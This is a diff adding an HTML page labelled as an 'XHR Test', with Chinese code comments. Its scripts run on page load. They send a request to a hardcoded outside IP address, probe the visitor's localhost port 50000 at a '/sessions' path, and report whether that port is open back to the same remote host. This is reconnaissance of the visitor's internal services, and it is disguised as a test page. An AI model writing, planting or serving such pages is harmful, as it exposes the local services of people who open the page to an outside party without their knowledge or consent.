@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XHR Test</title>
+</head>
+<body>
+    <h1>XHR Test Page</h1>
+    <div id="status">Loading...</div>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://156.251.131.63/', true); // 替換為你的 webhook ID
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) { // 請求完成
+                var statusDiv = document.getElementById('status');
+                if (xhr.status >= 200 && xhr.status < 300) { // 成功響應
+                    statusDiv.textContent = 'XHR Completed Successfully! Response: ' + xhr.responseText;
+                    window.xhrCompleted = true; // 設定全局標誌
+                } else { // 錯誤響應
+                    statusDiv.textContent = 'XHR Failed! Status: ' + xhr.status + ', Response: ' + xhr.responseText;
+                    window.xhrCompleted = true; // 即使失敗也設定標誌，表示已完成
+                }
+            }
+        };
+
+        xhr.onerror = function() {
+            var statusDiv = document.getElementById('status');
+            statusDiv.textContent = 'XHR Network Error!';
+            window.xhrCompleted = true; // 網絡錯誤也算完成
+        };
+
+        xhr.send(JSON.stringify({ key: 'value', timestamp: new Date().toISOString() }));
+
+        // 也可以設定一個超時，以防萬一 XHR 永遠不完成
+        setTimeout(function() {
+            if (!window.xhrCompleted) {
+                document.getElementById('status').textContent = 'XHR timed out!';
+                window.xhrCompleted = true;
+            }
+        }, 10000); // 10秒超時
+    </script>
+    <script>
+        const TARGET_PORT = 50000;
+        const WEBHOOK_REPORT_URL = 'http://156.251.131.63/';
+        const TIMEOUT_MS = 5000; // 給端口檢查設定一個超時時間
+
+        var statusDiv = document.getElementById('status');
+        window.xhrCompleted = false; // 全局標誌，表示整個流程是否完成
+
+        // --- 步驟 1: 檢查指定端口是否開放 ---
+        var portCheckXhr = new XMLHttpRequest();
+        portCheckXhr.open('GET', `http://127.0.0.1:${TARGET_PORT}/sessions`, true);
+        portCheckXhr.timeout = TIMEOUT_MS; // 設置超時
+
+        portCheckXhr.onload = function() {
+            // 如果 onload 觸發，表示成功連接到服務器並收到響應。
+            // 即使是 4xx/5xx 狀態碼，也說明端口是開放的。
+            console.log(`Port ${TARGET_PORT} check: OPEN (Status: ${portCheckXhr.status})`);
+            statusDiv.textContent = `Port ${TARGET_PORT}: OPEN! Sending report...`;
+            sendFinalReport(TARGET_PORT, 1); // 端口開放，發送 open=1
+        };
+
+        portCheckXhr.onerror = function() {
+            // 網絡錯誤，例如連接被拒絕、DNS 解析失敗等，表示端口可能關閉或無法訪問。
+            console.error(`Port ${TARGET_PORT} check: CLOSED (Network Error)`);
+            statusDiv.textContent = `Port ${TARGET_PORT}: CLOSED (Network Error)! Sending report...`;
+            sendFinalReport(TARGET_PORT, 0); // 端口關閉，發送 open=0
+        };
+
+        portCheckXhr.ontimeout = function() {
+            // 請求超時，表示在指定時間內沒有收到服務器響應。
+            console.error(`Port ${TARGET_PORT} check: CLOSED (Timeout)`);
+            statusDiv.textContent = `Port ${TARGET_PORT}: CLOSED (Timeout)! Sending report...`;
+            sendFinalReport(TARGET_PORT, 0); // 端口關閉，發送 open=0
+        };
+
+        try {
+            portCheckXhr.send();
+        } catch (e) {
+            // 處理 xhr.send() 自身可能拋出的異常 (不常見)
+            console.error(`Port ${TARGET_PORT} check: XHR Send Exception: ${e.message}`);
+            statusDiv.textContent = `Port ${TARGET_PORT}: CLOSED (XHR Send Exception)! Sending report...`;
+            sendFinalReport(TARGET_PORT, 0); // 發送異常，也認為端口關閉
+        }
+
+        // --- 步驟 2: 根據端口檢查結果發送最終報告 ---
+        function sendFinalReport(port, openStatus) {
+            var reportXhr = new XMLHttpRequest();
+            var reportUrl = `${WEBHOOK_REPORT_URL}?port=${port}&open=${openStatus}`;
+
+            reportXhr.open('GET', reportUrl, true);
+
+            reportXhr.onreadystatechange = function () {
+                if (reportXhr.readyState === 4) {
+                    if (reportXhr.status >= 200 && reportXhr.status < 300) {
+                        statusDiv.textContent += ` Report sent successfully! Response: ${reportXhr.responseText}`;
+                    } else {
+                        statusDiv.textContent += ` Report failed! Status: ${reportXhr.status}, Response: ${reportXhr.responseText}`;
+                    }
+                    window.xhrCompleted = true; // 報告發送完成，設置全局標誌
+                }
+            };
+
+            reportXhr.onerror = function() {
+                statusDiv.textContent += ' Report XHR Network Error!';
+                window.xhrCompleted = true; // 網絡錯誤也算完成
+            };
+
+            reportXhr.send();
+        }
+
+        // --- 超時處理 (用於整個流程的最終狀態) ---
+        setTimeout(function() {
+            if (!window.xhrCompleted) {
+                statusDiv.textContent = 'Overall process timed out before report could be sent!';
+                window.xhrCompleted = true;
+                // 如果端口檢查甚至沒有完成，這裡可以選擇是否發送一個默認的關閉報告
+                // 但為了不更動主要邏輯，這裡只更新狀態
+            }
+        }, TIMEOUT_MS + 2000); // 給端口檢查和報告發送留足夠時間，例如總共 7 秒
+    </script>
+</body>
+</html>
